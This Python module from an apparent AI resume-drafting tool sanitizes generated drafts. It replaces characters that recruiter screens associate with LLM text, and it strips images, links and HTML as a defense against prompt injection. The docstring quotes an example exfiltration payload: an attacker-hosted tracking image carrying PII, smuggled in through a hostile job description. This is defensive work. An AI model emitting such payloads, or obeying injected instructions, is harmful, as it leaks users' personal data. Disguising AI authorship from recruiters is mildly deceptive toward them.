"""ATS character ban list + draft exfil-vector stripping — the server-side
guarantees on generated (or user-edited) draft markdown.

Two independent guarantees, both enforced at the ``drafts.save_markdown`` choke
point so they hold no matter which provider produced the text or whether the user
hand-edited it:

1. **Character bans.** Some ATS / recruiter screens flag em-dash-heavy or
   smart-quote-laden text as LLM-generated. ``sanitize`` maps the obvious
   substitutions to ASCII; drafting also asserts nothing banned remains.

2. **Exfil-vector stripping.** A tailored draft is rendered to PDF by a browser
   engine and physically sent to an employer. Job descriptions are untrusted, so a
   prompt-injected draft could carry a tracking image ``![](https://attacker/p?d=<PII>)``
   whose URL the PDF engine fetches on render (data exfiltration), or a clickable
   tracking link reaching the employer. ``strip_exfil_vectors`` removes markdown /
   HTML images and neutralizes links to plain text. This is defense-in-depth with the
   network-blocked PDF engine; neither alone is trusted.
"""

from __future__ import annotations

import re

# Banned char -> ASCII replacement. Keep this list in sync with the ban section
# of `ai/prompts/draft.md` and `.claude/commands/draft.md`.
REPLACEMENTS: dict[str, str] = {
    "—": "-",  # em dash —
    "–": "-",  # en dash –
    "“": '"',  # left double smart quote “
    "”": '"',  # right double smart quote ”
    "‘": "'",  # left single smart quote ‘
    "’": "'",  # right single smart quote ’
    "…": "...",  # ellipsis …
    " ": " ",  # non-breaking space
    "​": "",  # zero-width space
    "‌": "",  # zero-width non-joiner
    "‍": "",  # zero-width joiner
    "﻿": "",  # BOM / zero-width no-break space
    "•": "-",  # bullet •
    "▪": "-",  # black small square ▪
    "▶": "-",  # play triangle ▶
    "★": "-",  # star ★
}

BANNED_CHARS: frozenset[str] = frozenset(REPLACEMENTS)


def sanitize(text: str) -> str:
    """Replace every banned character with its ASCII equivalent."""
    if not text:
        return text
    for bad, good in REPLACEMENTS.items():
        if bad in text:
            text = text.replace(bad, good)
    return text


def find_banned(text: str) -> list[str]:
    """Return the sorted distinct banned characters present in ``text``."""
    return sorted({ch for ch in text if ch in BANNED_CHARS})


# ---- exfil-vector stripping (draft output) --------------------------------

# Markdown image `![alt](url)` — removed entirely. Images are never legitimate in an
# ATS resume/cover letter, and an image URL is the auto-fetched exfil vector.
_MD_IMAGE_RE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
# Markdown inline link `[text](url)` — kept as plain, non-clickable text so a real
# contact link (github.com/name) survives as readable text but can't be a tracking
# link or an autofetched resource.
_MD_LINK_RE = re.compile(r"\[([^\]]*)\]\(\s*([^)\s]*)[^)]*\)")
# Reference-style link definition line `[ref]: url`.
_MD_REF_DEF_RE = re.compile(r"(?im)^[ \t]*\[[^\]]+\]:[ \t]*\S+.*$")
# Angle-bracket autolink to a URL `<https://...>` — unwrap to plain text.
_AUTOLINK_RE = re.compile(r"<((?:https?|ftp)://[^>\s]+)>", re.IGNORECASE)
# Raw HTML tags that fetch or execute — belt to the markdown renderer's html=False.
_HTML_TAG_RE = re.compile(
    r"</?\s*(?:img|a|iframe|script|style|link|object|embed|svg|base)\b[^>]*>",
    re.IGNORECASE,
)


def _link_to_text(match: "re.Match[str]") -> str:
    label = match.group(1).strip()
    url = match.group(2).strip()
    if label and url and label != url:
        return f"{label} ({url})"
    return label or url


def strip_exfil_vectors(text: str) -> str:
    """Remove images and neutralize links/raw HTML from draft markdown.

    Images (markdown or raw ``<img>``) are dropped outright; inline and autolink URLs
    are flattened to plain, non-clickable text; reference link definitions and other
    resource-loading HTML tags are removed. Idempotent. See the module docstring for
    why (PDF render fetches image URLs; the draft reaches a real employer)."""
    if not text:
        return text
    text = _MD_IMAGE_RE.sub("", text)
    text = _MD_REF_DEF_RE.sub("", text)
    text = _AUTOLINK_RE.sub(r"\1", text)
    text = _MD_LINK_RE.sub(_link_to_text, text)
    text = _HTML_TAG_RE.sub("", text)
    return text


def find_exfil_vectors(text: str) -> list[str]:
    """Diagnostic: image/link/HTML-tag constructs still present after a strip pass.
    Should always be empty post-``strip_exfil_vectors``; used to assert that."""
    hits: list[str] = []
    if _MD_IMAGE_RE.search(text):
        hits.append("markdown image")
    if _MD_LINK_RE.search(text):
        hits.append("markdown link")
    if _AUTOLINK_RE.search(text):
        hits.append("autolink")
    if _HTML_TAG_RE.search(text):
        hits.append("html tag")
    return hits
